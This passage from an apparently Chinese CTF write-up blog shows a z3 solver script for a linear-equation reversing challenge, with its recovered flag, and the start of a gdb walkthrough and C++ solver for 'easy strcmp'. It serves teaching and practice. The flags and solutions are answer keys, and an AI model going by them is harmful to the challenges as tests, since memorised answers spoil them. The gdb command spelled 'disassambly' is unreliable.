class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==<span class="number">-196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==<span class="number">-945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==<span class="number">-480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==<span class="number">-213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==<span class="number">-386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==<span class="number">-349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==<span class="number">-412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==<span class="number">-95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==<span class="number">-379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span class="number">18</span>]+l[<span class="number">6</span>]==<span class="number">-1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==<span class="number">-114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==<span class="number">-430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==<span class="number">-513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==<span class="number">-502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==<span class="number">-28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==<span class="number">-529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==<span class="number">-12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>]==<span class="number">81</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        a.append(s.model()[i].as_long())</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

flag&#123;A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3&#125;

感觉实际解的话使用栈模型看括号似乎比较容易。

js才是世界上最好的语言。。

参考资料 [BUUCTF--equation_Hk_Mayfly的博客-CSDN博客](https://blog.csdn.net/qq_39542714/article/details/106834909)

## [rev]easy strcmp

1. 使用IDA打开，发现虚假的main函数

2. 进行调试，在puts下断点，找到主函数位于0x55555555481e附近

3. 反编译程序，查看源码

4. 在puts之前一些地方下断点，重新调试

   强制gdb反汇编某个地方

   当gdb接收一个参数时，gdb会尝试反汇编包含那个地址的函数

   当gdb接受两个参数时，gdb会尝试反汇编那个区间的代码

   disassambly start,end

   disassambly start,+len

5. 发现程序主逻辑：把用户输入加上一些偏移量与加密字符串比较c++

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> fflag[] = <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> diff[] = &#123;<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>ll, <span 